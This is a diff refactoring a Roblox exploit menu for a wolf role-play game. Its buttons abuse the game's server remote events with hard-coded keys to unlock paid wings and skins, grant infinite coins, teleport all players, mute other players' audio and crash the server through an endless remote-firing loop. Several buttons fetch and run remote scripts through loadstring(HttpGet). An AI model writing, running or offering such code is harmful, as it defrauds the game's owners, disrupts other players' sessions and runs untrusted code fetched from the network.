@@ -14,42 +14,25 @@ local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Syr0n
 Window = Library.Main("WLF3 Syr0nix#0407","RightShift")
 local Tab = Window.NewTab("Gamepeass")
 local Section = Tab.NewSection("BE FREE")
-local Button = Section.NewButton("Wings",function()
-	local args = {[1] = "Wings",[2] = 0,[3] = "\230\139\154\230\136\172i\235\156\146(\238\138\155\201\172XD"}
-	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
-end)
-local Button = Section.NewButton("Ocean Skin",function()
-	local args = {[1] = "Ocean",[2] = 0,[3] = "\230\139\154\230\136\172i\235\156\146(\238\138\155\201\172XD"}
-	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
-end)
-local Button = Section.NewButton("Dragon skin",function()
-	local args = {[1] = "Dragon",[2] = 0,[3] = "\230\139\154\230\136\172i\235\156\146(\238\138\155\201\172XD"}
-	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
-end)
-local Button = Section.NewButton("Remove Wings",function()
-	local args = {[1] = "Wings",[2] = 1,[3] = "\230\139\154\230\136\172i\235\156\146(\238\138\155\201\172XD"}
-	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
-end)
-local Button = Section.NewButton("Remove Ocean skin",function()
-	local args = {[1] = "Ocean",[2] = 1,[3] = "\230\139\154\230\136\172i\235\156\146(\238\138\155\201\172XD"}
-	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
-end)
-local Button = Section.NewButton("Remove Dragon skin",function()
-	local args = {[1] = "Dragon",[2] = 1,[3] = "\230\139\154\230\136\172i\235\156\146(\238\138\155\201\172XD"}
-	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
-end)
-local Button = Section.NewButton("Adult",function()
-local args = {[1] = "Age",[2] = "Adult"}
-game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
-end)
-local Button = Section.NewButton("Pup",function()
-local args = {[1] = "Age",[2] = "Pup"}
-game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
-end)
-local Button = Section.NewButton("Newborn",function()
-local args = {[1] = "Age",[2] = "Newborn"}
-game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
-end)
+local function createButton(name, arg1, arg2)
+    local args = {[1] = arg1, [2] = arg2, [3] = "\230\139\154\230\136\172i\235\156\146(\238\138\155\201\172XD"}
+    Section.NewButton(name, function()
+        game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
+    end)
+end
+createButton("Wings", "Wings", 0)
+createButton("Ocean Skin", "Ocean", 0)
+createButton("Dragon skin", "Dragon", 0)
+createButton("Remove Wings", "Wings", 1)
+createButton("Remove Ocean skin", "Ocean", 1)
+createButton("Remove Dragon skin", "Dragon", 1)
+local ageButtons = {"Adult", "Pup", "Newborn"}
+for _, age in pairs(ageButtons) do
+    Section.NewButton(age, function()
+        local args = {[1] = "Age",[2] = age}
+        game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
+    end)
+end
 local Tab = Window.NewTab("VIW")
 local Section = Tab.NewSection("Wana Be VIW")
 local Button = Section.NewButton("VIW TAG",function()
@@ -66,64 +49,60 @@ end)
 --Made by: Flixz_y and Colby
 _G.SpamLights = false
 local EnabledToggle = Section.NewToggle("SpamLights!", function(bool)
-	if _G.SpamLights then
-		_G.SpamLights = false
-		return
-	else
-		_G.SpamLights = true
-	end
+    if _G.SpamLights then
+        _G.SpamLights = false
+        return
+    else
+        _G.SpamLights = true
+    end
 
-	while _G.SpamLights do
-		for _, L in next, workspace.Models:GetDescendants() do
-			if L:IsA("ClickDetector") then
-				fireclickdetector(L)
-			end
-		end
-		task.wait()
-	end
+    while _G.SpamLights do
+        for _, L in next, workspace.Models:GetDescendants() do
+            if L:IsA("ClickDetector") then
+                fireclickdetector(L)
+            end
+        end
+        task.wait(0.1)
+    end
 end)
 local Button = Section.NewButton("RTX", function()
-	-- Made by Colby :D
-	sunrays = game.Lighting.SunRays
-	s = Instance.new("DepthOfFieldEffect")
-	a = game.Lighting.Atmosphere
-	game.Lighting.OutdoorAmbient = Color3.fromRGB(50, 50, 50)
-	game.Lighting.Ambient = Color3.fromRGB(20, 20, 20)
-	sunrays.Intensity = 0.1
-	s.FarIntensity = 0.20
-	s.FocusDistance = 0.05
-	s.InFocusRadius = 15
-	s.NearIntensity = 0.75
-	s.Parent = game.Lighting
-	sunrays.Parent = game.Lighting
-	a.Density = .1
-	a.Haze = 0
-	a.Glare = 1
-	a.Offset = 0
-	a.Decay = Color3.fromRGB(159, 43, 104)
-	print("Rtx Enabled")
+--made by Colby :D
+    local sunrays = game.Lighting.SunRays
+    local s = Instance.new("DepthOfFieldEffect")
+    local a = game.Lighting.Atmosphere
+    game.Lighting.OutdoorAmbient = Color3.fromRGB(50, 50, 50)
+    game.Lighting.Ambient = Color3.fromRGB(20, 20, 20)
+    sunrays.Intensity = 0.1
+    s.FarIntensity = 0.20
+    s.FocusDistance = 0.05
+    s.InFocusRadius = 15
+    s.NearIntensity = 0.75
+    s.Parent = game.Lighting
+    sunrays.Parent = game.Lighting
+    a.Density = .1
+    a.Haze = 0
+    a.Glare = 1
+    a.Offset = 0
+    a.Decay = Color3.fromRGB(159, 43, 104)
+    print("Rtx Enabled")
 end)
 local Button = Section.NewButton("Audio Player",function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/Syr0nix/Syr0nix-Audio-Player/main/Audio%20Player'))();
 end)
 _G.autoaudiomute = false
-local EnabledToggle = Section.NewToggle("Mute VIW Music",function(bool)
-	if _G.autoaudiomute then
-		_G.autoaudiomute = false
-		return
-	else
-		_G.autoaudiomute = true
-	end
-	while _G.autoaudiomute do
-		task.wait()
-		for _,v in next, game:GetService('Players'):GetPlayers()do
-			if v.Character and v.Character.Parent ~= nil and v.Character:FindFirstChild('HumanoidRootPart') and v.Character:FindFirstChild('HumanoidRootPart'):FindFirstChild('RadioM') then
-				v.Character:FindFirstChild('HumanoidRootPart'):FindFirstChild('RadioM'):Stop()
-				v.Character:FindFirstChild('HumanoidRootPart'):FindFirstChild('RadioM').Playing = false
-			end
-		end
-	end
+local EnabledToggle = Section.NewToggle("Mute VIW Music", function(bool)
+    _G.autoaudiomute = not _G.autoaudiomute
+    while _G.autoaudiomute do
+        task.wait()
+        for _, v in next, game:GetService('Players'):GetPlayers() do
+            if v ~= game.Players.LocalPlayer and v.Character and v.Character.Parent ~= nil and v.Character:FindFirstChild('HumanoidRootPart') and v.Character:FindFirstChild('HumanoidRootPart'):FindFirstChild('RadioM') then
+                v.Character:FindFirstChild('HumanoidRootPart'):FindFirstChild('RadioM'):Stop()
+                v.Character:FindFirstChild('HumanoidRootPart'):FindFirstChild('RadioM').Playing = false
+            end
+        end
+    end
 end)
+
 local timergb, RBW_COL = 7
 rgb1 = game:GetService('RunService').Heartbeat:Connect(function()
 	local hue = tick() % timergb / timergb
@@ -201,22 +180,16 @@ local Button = Section.NewToggle("Auto Description",function()
 end)
 local Tab = Window.NewTab("Admin")
 local Section = Tab.NewSection("Wana Be Admin")
-local Button = Section.NewButton("Crash Server",function()
-while true do
-			game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age','Adult')
-			game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age','Pup')
-			game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age','Newborn')
-			game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age','Adult')
-			game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age','Pup')
-			game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age','Newborn')
-			game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age','Adult')
-			game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age','Pup')
-			game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age','Newborn')
-			game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age','Adult')
-			game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age','Pup')
-			game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age','Newborn')
-		task.wait()
-	end
+local Button = Section.NewButton("Crash Server", function()
+    local MasterKey = game.ReplicatedStorage:FindFirstChild('MasterKey')
+    while true do
+        for i = 1, 7 do
+            MasterKey:FireServer('Age', 'Adult')
+            MasterKey:FireServer('Age', 'Pup')
+            MasterKey:FireServer('Age', 'Newborn')
+        end
+        task.wait()
+    end
 end)
 local Button = Section.NewButton("Server Browser GUI",function()
     loadstring(game:HttpGet('https://www.scriptblox.com/raw/Server-Browser_80', true))();
@@ -233,23 +206,6 @@ end)
 local Button = Section.NewButton("Homebrew Admin",function()
 _G.CustomUI = false
 	loadstring(game:HttpGet(('https://raw.githubusercontent.com/mgamingpro/HomebrewAdmin/master/Main'),true))()
-end)
-local Button = Section.NewButton("OG fling",function()
--- FE Fling Spin
--- Lock on to player And fling together works all the time :)
--- Made by syr0nix
-power = 1500 -- change this to make it more or less powerful
-game:GetService('RunService').Stepped:connect(function()
-game.Players.LocalPlayer.Character.Head.CanCollide = false
-game.Players.LocalPlayer.Character.Torso.CanCollide = false
-game.Players.LocalPlayer.Character["Left Leg"].CanCollide = false
-game.Players.LocalPlayer.Character["Right Leg"].CanCollide = false
-end)
-wait(.1)
-local bambam    = Instance.new("BodyThrust")
-bambam.Parent   = game.Players.LocalPlayer.Character.HumanoidRootPart
-bambam.Force    = Vector3.new(power,0,power)
-bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
 end)
 local Button = Section.NewButton("Chat Logger",function()
 -- Version: 2.82
@@ -397,20 +353,15 @@ UIS.InputBegan:Connect(function(input)
    end
 end)
 end)
-local Button = Section.NewButton("Teleport all",function()
-	for i,v in pairs(game.Players:GetChildren()) do
-		game:GetService("ReplicatedStorage").CarryNewborn:FireServer(v)
-		wait(0.2)
-		local G_1 = "Spawn"
-		local G_2 = "Adoption"
-		game:GetService("ReplicatedStorage").MasterKey:FireServer(G_1, G_2)
-		wait(0.2)
-		local G_1 = "Kick Eggs"
-		game:GetService("ReplicatedStorage").CarryNewborn:FireServer(G_1)
-		wait(0.2)
-	end
-	-- Everyone teleport to you
-	-- Made by Syr0nix
+local Button = Section.NewButton("Teleport all", function()
+    for i, v in pairs(game.Players:GetChildren()) do
+        game:GetService("ReplicatedStorage").CarryNewborn:FireServer(v)
+        wait(0.2)
+        game:GetService("ReplicatedStorage").MasterKey:FireServer("Spawn", "Adoption")
+        wait(0.2)
+        game:GetService("ReplicatedStorage").CarryNewborn:FireServer("Kick Eggs")
+        wait(0.2)
+    end
 end)
 local Button = Section.NewButton("INF CASH",function()
 	local args = {[1] = "Coins",[2] = math.huge,[3] = "\226\135\154\225\155\157i\220\176\219\173\230\155\157u"}
@@ -609,30 +560,18 @@ local Button = Section.NewButton("Male",function()
 	local args = {[1] = "Male"}
 	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
 end)
-local Button = Section.NewButton("File 1",function()
-	local args = {[1] = "LoadFile1Colours",[2] = "1",[3] = "\195\137,\203\1561\194\181\195\154+t\226\149\165\195\1304\194\180\195\134\195\138\226\134\168\226\149\147"}
-	game:GetService("ReplicatedStorage").Save:InvokeServer(unpack(args))
-end)
-local Button = Section.NewButton("File 2",function()
-	local args = {[1] = "LoadFile1Colours",[2] = "2",[3] = "\195\137,\203\1561\194\181\195\154+t\226\149\165\195\1304\194\180\195\134\195\138\226\134\168\226\149\147"}
-	game:GetService("ReplicatedStorage").Save:InvokeServer(unpack(args))
-end)
-local Button = Section.NewButton("File 3",function()
-	local args = {[1] = "LoadFile1Colours",[2] = "3",[3] = "\195\137,\203\1561\194\181\195\154+t\226\149\165\195\1304\194\180\195\134\195\138\226\134\168\226\149\147"}
-	game:GetService("ReplicatedStorage").Save:InvokeServer(unpack(args))
-end)
-local Button = Section.NewButton("Save 1",function()
-	local args = {[1] = "SaveFile1Colours",[2] = "1",[3] = "\195\137,\203\1561\194\181\195\154+t\226\149\165\195\1304\194\180\195\134\195\138\226\134\168\226\149\147"}
-	game:GetService("ReplicatedStorage").Save:InvokeServer(unpack(args))
-end)
-local Button = Section.NewButton("Save 2",function()
-	local args = {[1] = "SaveFile1Colours",[2] = "2",[3] = "\195\137,\203\1561\194\181\195\154+t\226\149\165\195\1304\194\180\195\134\195\138\226\134\168\226\149\147"}
-	game:GetService("ReplicatedStorage").Save:InvokeServer(unpack(args))
-end)
-local Button = Section.NewButton("Save 3",function()
-	local args = {[1] = "SaveFile1Colours",[2] = "3",[3] = "\195\137,\203\1561\194\181\195\154+t\226\149\165\195\1304\194\180\195\134\195\138\226\134\168\226\149\147"}
-	game:GetService("ReplicatedStorage").Save:InvokeServer(unpack(args))
-end)
+local function createButton(name, arg1, arg2)
+    local args = {[1] = arg1, [2] = arg2, [3] = "\195\137,\203\1561\194\181\195\154+t\226\149\165\195\1304\194\180\195\134\195\138\226\134\168\226\149\147"}
+    Section.NewButton(name, function()
+        game:GetService("ReplicatedStorage").Save:InvokeServer(unpack(args))
+    end)
+end
+createButton("File 1", "LoadFile1Colours", "1")
+createButton("File 2", "LoadFile1Colours", "2")
+createButton("File 3", "LoadFile1Colours", "3")
+createButton("Save 1", "SaveFile1Colours", "1")
+createButton("Save 2", "SaveFile1Colours", "2")
+createButton("Save 3", "SaveFile1Colours", "3")
 local Button = Section.NewButton("Explorer",function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/Syr0nix/DEX-Synapse-Edition/main/DEX'))();
 end)
@@ -866,36 +805,49 @@ game:GetService("ReplicatedStorage").MasterKey:FireServer(G_1, G_2, G_3)
 print "SAY10 Made this BIG DADY COCK"
 end)
 _G.Rainbowwings = false
-local EnabledToggle = Section.NewToggle("Rainbow wings",function(bool)
-	if _G.Rainbowwings then
-		_G.Rainbowwings = false
-		return
-	else
-		_G.Rainbowwings = true
-	end	
-		local Mat = "Neon"
-	local SecondaryArgs={[1]="Material",[2]=Mat,[3]={[1]="DragonThird",[2]="DragonPrimary",[3]="OceanPrimary",[4]="Nose",[5]="EyeColor",}}
-	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(SecondaryArgs))
-	while _G.Rainbowwings do
-		task.wait()
-			local mk1 = game:service('ReplicatedStorage'):FindFirstChild('MasterKey')
-			mk1:FireServer("customize", {[1] = "EyeColor",[2] = "Nose",[3] = "DragonPrimary",[4] = "DragonThird",[5] = "OceanPrimary", },Color3.new(RBW_COL.R,RBW_COL.G,RBW_COL.B),"Body")
-	end
-	
-end,false)
-local Button = Section.NewButton("all neon",function()
+local EnabledToggle = Section.NewToggle("Rainbow wings", function(bool)
+    _G.Rainbowwings = not _G.Rainbowwings
+    if _G.Rainbowwings then
+        local Mat = "Neon"
+        local SecondaryArgs = {
+            [1] = "Material",
+            [2] = Mat,
+            [3] = {
+                [1] = "DragonThird",
+                [2] = "DragonPrimary",
+                [3] = "OceanPrimary",
+                [4] = "Nose",
+                [5] = "EyeColor",
+            }
+        }
+        game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(SecondaryArgs))
+        while _G.Rainbowwings do
+            task.wait()
+            local mk1 = game:service('ReplicatedStorage'):FindFirstChild('MasterKey')
+            mk1:FireServer("customize", {
+                [1] = "EyeColor",
+                [2] = "Nose",
+                [3] = "DragonPrimary",
+                [4] = "DragonThird",
+                [5] = "OceanPrimary",
+            }, Color3.new(RBW_COL.R, RBW_COL.G, RBW_COL.B), "Body")
+        end
+    end
+end, false)
+local Button = Section.NewButton("all neon", function()
     local Mat = "Neon"
-    local Hair = {[1] = "AccessoryMaterial",[2] = Mat,[3] = "HairF"}
-    local Torso = {[1] = "AccessoryMaterial",[2] = Mat,[3] = "TorsoF"}
-    local Legs = {[1] = "AccessoryMaterial",[2] = Mat,[3] = "FeetF"}
-    local SecondaryArgs={[1]="Material",[2]=Mat,[3]={[1]="DragonSecondary",[2]="OceanSecondary",[3]="ChubbyCheeks",[4]="Fat",[5]="EarFluff",[6]="JawFluff",[7]="ChestFluff",[8]="LegFluff",[9]="Eyebrow1",[10]="Eyebrow2",[11]="Secondary",[12]="Jaw",[13]="RightShoulder",[14]="RightLowerLeg",[15]="RightLowerArm",[16]="RightLeg",[17]="RightFootPaw",[18]="LeftArm",[19]="LeftArmPaw",[20]="LeftCarpal",[21]="LeftFootPaw",[22]="LeftLeg",[23]="LeftLowerArm",[24]="LeftLowerLeg",[25]="LeftShoulder",[26]="RightArm",[27]="RightArmPaw",[28]="RightCarpal",[29]="DragonThird"}}
-    local PrimaryArgs={[1]="Material",[2]=Mat,[3]={[1]="DragonPrimary",[2]="OceanPrimary",[3]="BackFluff",[4]="TailFluff",[5]="LeftWingStart",[6]="LeftWing2",[7]="LeftWing3",[8]="RightWingStart",[9]="RightWing2",[10]="RightWing3",[11]="EyeLid",[12]="Torso",[13]="Tail1",[14]="Tail2",[15]="Tail3",[16]="Tail5",[17]="Tail6",[18]="RightThigh",[19]="RightEar",[20]="EyeLid",[21]="Head",[22]="Hip",[23]="LeftEar",[24]="LeftThigh",[25]="Muzzle",[26]="Neck",[27]="NeckReal",[28]="Nose",}}
-    --
-    game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(Hair))
-    game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(Torso))
-    game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(Legs))
-    game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(SecondaryArgs))
-    game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(PrimaryArgs))
+    local Hair = {"AccessoryMaterial", Mat, "HairF"}
+    local Torso = {"AccessoryMaterial", Mat, "TorsoF"}
+    local Legs = {"AccessoryMaterial", Mat, "FeetF"}
+    local SecondaryArgs = {"Material", Mat, {"DragonSecondary", "OceanSecondary", "ChubbyCheeks", "Fat", "EarFluff", "JawFluff", "ChestFluff", "LegFluff", "Eyebrow1", "Eyebrow2", "Secondary", "Jaw", "RightShoulder", "RightLowerLeg", "RightLowerArm", "RightLeg", "RightFootPaw", "LeftArm", "LeftArmPaw", "LeftCarpal", "LeftFootPaw", "LeftLeg", "LeftLowerArm", "LeftLowerLeg", "LeftShoulder", "RightArm", "RightArmPaw", "RightCarpal","DragonThird"}}
+    local PrimaryArgs = {"Material", Mat, {"DragonPrimary","OceanPrimary","BackFluff","TailFluff","LeftWingStart","LeftWing2","LeftWing3","RightWingStart","RightWing2","RightWing3","EyeLid","Torso","Tail1","Tail2","Tail3","Tail5","Tail6","RightThigh","RightEar","EyeLid","Head","Hip","LeftEar","LeftThigh","Muzzle","Neck","NeckReal","Nose"}}
+    
+    local MasterKey = game:GetService("ReplicatedStorage").MasterKey
+    MasterKey:FireServer(unpack(Hair))
+    MasterKey:FireServer(unpack(Torso))
+    MasterKey:FireServer(unpack(Legs))
+    MasterKey:FireServer(unpack(SecondaryArgs))
+    MasterKey:FireServer(unpack(PrimaryArgs))
 end)
 local Button = Section.NewButton("Neon Toungue",function()
 	--Made by syr0nix
@@ -904,145 +856,82 @@ local Button = Section.NewButton("Neon Toungue",function()
 end)
 local Tab = Window.NewTab("Objects")
 local Section = Tab.NewSection("Lazy Ass")
-local Button = Section.NewButton("Raw Venison",function()
-	local items = {['Raw Venison'] = workspace.ItemOnes['Raw Venison'],}
-	function getItem(what)
-		return fireclickdetector(items[what]:FindFirstChildOfClass('ClickDetector'))
-	end
-	getItem('Raw Venison')
+local function getItem(what, items)
+    return fireclickdetector(items[what]:FindFirstChildOfClass('ClickDetector'))
+end
+local function createButton(name, item)
+    local Button = Section.NewButton(name, function()
+        local items = {[name] = workspace.ItemOnes[item]}
+        getItem(name, items)
+    end)
+end
+createButton("Raw Venison", "Raw Venison")
+createButton("Raw Porkchop", "Raw Porkchop")
+createButton("Raw Chicken Leg", "Raw Chicken Leg")
+createButton("Raw Chicken Breast", "Raw Chicken Breast")
+createButton("Raw Rabbit", "Raw Rabbit")
+createButton("Raw Beef", "Raw Beef")
+createButton("Duck", "Duck")
+createButton("Football", "Football")
+createButton("Fish", "Raw Fish")
+createButton("Ball", "Ball")
+local Button = Section.NewButton("Torch", function()
+    local items = {['Torch'] = workspace.GroupedItems.Torch.Handle}
+    getItem('Torch', items)
 end)
-local Button = Section.NewButton("Raw Porkchop",function()
-	local items = {['Raw Porkchop'] = workspace.ItemOnes['Raw Porkchop'],}
-	function getItem(what)
-		return fireclickdetector(items[what]:FindFirstChildOfClass('ClickDetector'))
-	end
-	getItem('Raw Porkchop')
+local Button = Section.NewButton("Bone", function()
+    local items = {['Bone'] = workspace.GroupedItems.Bone}
+    getItem('Bone', items)
 end)
-local Button = Section.NewButton("Raw Chicken Leg",function()
-	local items = {['Raw Chicken Leg'] = workspace.ItemOnes['Raw Chicken Leg'],}
-	function getItem(what)
-		return fireclickdetector(items[what]:FindFirstChildOfClass('ClickDetector'))
-	end
-	getItem('Raw Chicken Leg')
+local Button = Section.NewButton("TeddyBear", function()
+    local items = {['TeddyBear'] = workspace.GroupedItems.TeddyBear}
+    getItem('TeddyBear', items)
 end)
-local Button = Section.NewButton("Raw Chicken Breast",function()
-	local items = {['Raw Chicken Breast'] = workspace.ItemOnes['Raw Chicken Breast'],}
-	function getItem(what)
-		return fireclickdetector(items[what]:FindFirstChildOfClass('ClickDetector'))
-	end
-	getItem('Raw Chicken Breast')
+local Button = Section.NewButton("Stick", function()
+    local items = {['Stick'] = workspace.GroupedItems.Stick}
+    getItem('Stick', items)
 end)
-local Button = Section.NewButton("Raw Rabbit",function()
-	local items = {['Raw Rabbit'] = workspace.ItemOnes['Raw Rabbit'],}
-	function getItem(what)
-		return fireclickdetector(items[what]:FindFirstChildOfClass('ClickDetector'))
-	end
-	getItem('Raw Rabbit')
-end)
-local Button = Section.NewButton("Raw Beef",function()
-	local items = {['Raw Beef'] = workspace.ItemOnes['Raw Beef'],}
-	function getItem(what)
-		return fireclickdetector(items[what]:FindFirstChildOfClass('ClickDetector'))
-	end
-	getItem('Raw Beef')
-end)
-local Button = Section.NewButton("Duck",function()
-	local items = {['Duck'] = workspace.ItemOnes['Duck'],}
-	function getItem(what)
-		return fireclickdetector(items[what]:FindFirstChildOfClass('ClickDetector'))
-	end
-	getItem('Duck')
-end)
-local Button = Section.NewButton("Football",function()
-	local items = {['Football'] = workspace.ItemOnes['Football'],}
-	function getItem(what)
-		return fireclickdetector(items[what]:FindFirstChildOfClass('ClickDetector'))
-	end
-	getItem('Football')
-end)
-local Button = Section.NewButton("Fish",function()
-	local items = {['fish'] = workspace.ItemOnes['Raw Fish'],}
-	function getItem(what)
-		return fireclickdetector(items[what]:FindFirstChildOfClass('ClickDetector'))
-	end
-	getItem('fish')
-end)
-local Button = Section.NewButton("Ball",function()
-	local items = {['Ball'] = workspace.ItemOnes['Ball'],}
-	function getItem(what)
-		return fireclickdetector(items[what]:FindFirstChildOfClass('ClickDetector'))
-	end
-	getItem('Ball')
-end)
-local Button = Section.NewButton("Torch",function()
-	local items = {['Torch'] = workspace.GroupedItems.Torch.Handle,}
-	function getItem(what)
-		return fireclickdetector(items[what]:FindFirstChildOfClass('ClickDetector'))
-	end
-	getItem('Torch')
-end)
-local Button = Section.NewButton("Bone",function()
-	local items = {['Bone'] = workspace.GroupedItems.Bone}
-	function getItem(what)
-		return fireclickdetector(items[what]:FindFirstChildOfClass('ClickDetector'))
-	end
-	getItem('Bone')
-end)
-local Button = Section.NewButton("TeddyBear",function()
-	local items = {['TeddyBear'] = workspace.GroupedItems.TeddyBear}
-	function getItem(what)
-		return fireclickdetector(items[what]:FindFirstChildOfClass('ClickDetector'))
-	end
-	getItem('TeddyBear')
-end)
-local Button = Section.NewButton("Stick",function()
-	local items = {['Stick'] = workspace.GroupedItems.Stick}
-	function getItem(what)
-		return fireclickdetector(items[what]:FindFirstChildOfClass('ClickDetector'))
-	end
-	getItem('Stick')
-end)
-local Button = Section.NewButton("Bunny",function()
-	local items = {['Bunny'] = workspace.Bunnies.Bunny['Hit'],}
-	function getItem(what)
-		return fireclickdetector(items[what]:FindFirstChildOfClass('ClickDetector'))
-	end
-	getItem('Bunny')
+local Button = Section.NewButton("Bunny", function()
+    local items = {['Bunny'] = workspace.Bunnies.Bunny['Hit']}
+    getItem('Bunny', items)
 end)
 local Tab = Window.NewTab("Toggles")
 local Section = Tab.NewSection("wana be sick")
 _G.rbweyes = false
-local EnabledToggle = Section.NewToggle("Rainbow Eyes",function(bool)
-	if _G.rbweyes then
-		_G.rbweyes = false
-		return
-	else
-		_G.rbweyes = true
-	end
-	local mk1 = game:service('ReplicatedStorage'):FindFirstChild('MasterKey')
-	while _G.rbweyes do
-		task.wait()
-		local args = {"customize",{ [10] = "EyeColor" },Color3.new(RBW_COL.R,RBW_COL.G,RBW_COL.B),"Body"}
-		mk1:FireServer(unpack(args))
-	end
-end,false)
-hsv = Color3.fromHSV
+local EnabledToggle = Section.NewToggle("Rainbow Eyes", function(bool)
+    _G.rbweyes = not _G.rbweyes
+    if _G.rbweyes then
+        local mk1 = game:service('ReplicatedStorage'):FindFirstChild('MasterKey')
+        while _G.rbweyes do
+            task.wait()
+            local args = {
+                "customize",
+                {[10] = "EyeColor"},
+                Color3.new(RBW_COL.R, RBW_COL.G, RBW_COL.B),
+                "Body"
+            }
+            mk1:FireServer(unpack(args))
+        end
+    end
+end, false)
+local hsv = Color3.fromHSV
 _G.rbwtag = false
-local EnabledToggle = Section.NewToggle("Rainbow Tag",function(bool)
-	if _G.rbwtag then
-		_G.rbwtag = false
-		return
-	else
-		_G.rbwtag = true
-	end
-	local mk1 = game:service('ReplicatedStorage'):FindFirstChild('MasterKey')
-	while _G.rbwtag do
-		task.wait()
-		local h,s,v = RBW_COL:ToHSV()
-		local args = {[1] = "ChangeColor",[2] = {hsv(h,s,v).R,hsv(h,s,v).G,hsv(h,s,v).B},[3] = "\226\128\153b%5m\226\128\176}0\195\1383t\195\154\226\149\147\195\146\226\148\140\226\128\166\226\151".."\153"}
-		mk1:FireServer(unpack(args))
-	end
-end,false)
+local EnabledToggle = Section.NewToggle("Rainbow Tag", function(bool)
+    _G.rbwtag = not _G.rbwtag
+    if _G.rbwtag then
+        local mk1 = game:service('ReplicatedStorage'):FindFirstChild('MasterKey')
+        while _G.rbwtag do
+            task.wait()
+            local h, s, v = RBW_COL:ToHSV()
+            local args = {
+                [1] = "ChangeColor",
+                [2] = {hsv(h, s, v).R, hsv(h, s, v).G, hsv(h, s, v).B},
+                [3] = "\226\128\153b%5m\226\128\176}0\195\1383t\195\154\226\149\147\195\146\226\148\140\226\128\166\226\151" .. "\153"
+            }
+            mk1:FireServer(unpack(args))
+        end
+    end
+end, false)
 _G.faderbw = false
 local EnabledToggle = Section.NewToggle("Rainbow Fade",function(bool)
 	if _G.faderbw then
@@ -1185,106 +1074,72 @@ local EnabledToggle = Section.NewToggle("particlefade",function(bool)
 	end -- end loop and start again
 end)
 local Tab = Window.NewTab("Teleports")
+local function createButton(Section, name, callback)
+    Section.NewButton(name, callback)
+end
+local function createSpawnButton(Section, name, spawnName)
+    createButton(Section, name, function()
+        local args = {[1] = "Spawn",[2] = spawnName}
+        game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
+    end)
+end
 local Section = Tab.NewSection("Forest Biome")
-local Button = Section.NewButton("Forest Biome",function()
-	local args = {[1] = "Spawn",[2] = "Forest Biome"}
-	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
+createSpawnButton(Section, "Forest Biome", "Forest Biome")
+createSpawnButton(Section, "Pup Adoption", "Adoption")
+createButton(Section, "Medic Den", function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1103.30884, 18.1427574, -114.369957, -0.311288834, -0.0115207694, 0.95024544, -0.0118246786, 0.999896049, 0.00824911054, -0.950241745, -0.00866849069, -0.311392784)
 end)
-local Button = Section.NewButton("Pup Adoption",function()
-	local args = {[1] = "Spawn",[2] = "Adoption"}
-game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
+createButton(Section, "Ship", function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(944.030334, 18.3770428, -53.5521202, -0.996551991, 0, -0.0829701647, 0, 1, 0, 0.0829701647, 0, -0.996551991)
 end)
-local Button = Section.NewButton("Medic Den",function()
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1103.30884, 18.1427574, -114.369957, -0.311288834, -0.0115207694, 0.95024544, -0.0118246786, 0.999896049, 0.00824911054, -0.950241745, -0.00866849069, -0.311392784)
-end)
-local Button = Section.NewButton("Ship",function()
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(944.030334, 18.3770428, -53.5521202, -0.996551991, 0, -0.0829701647, 0, 1, 0, 0.0829701647, 0, -0.996551991)
-end)
-local Button = Section.NewButton("School",function()
-	local args = {[1] = "Spawn",[2] = "School"}
-	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
-end)
-local Button = Section.NewButton("Store",function()
-	local args = {[1] = "Spawn",[2] = "Store"}
-	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
-end)
-local Button = Section.NewButton("Jail",function()
-	local args = {[1] = "Spawn",[2] = "Jail"}
-	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
-end)
-local Button = Section.NewButton("Camp",function()
-	local args = {[1] = "Spawn",[2] = "Camp"}
-	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
-end)
-local Button = Section.NewButton("Cafe",function()
-	local args = {[1] = "Spawn",[2] = "Caf\195\169"}
-	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
-end)
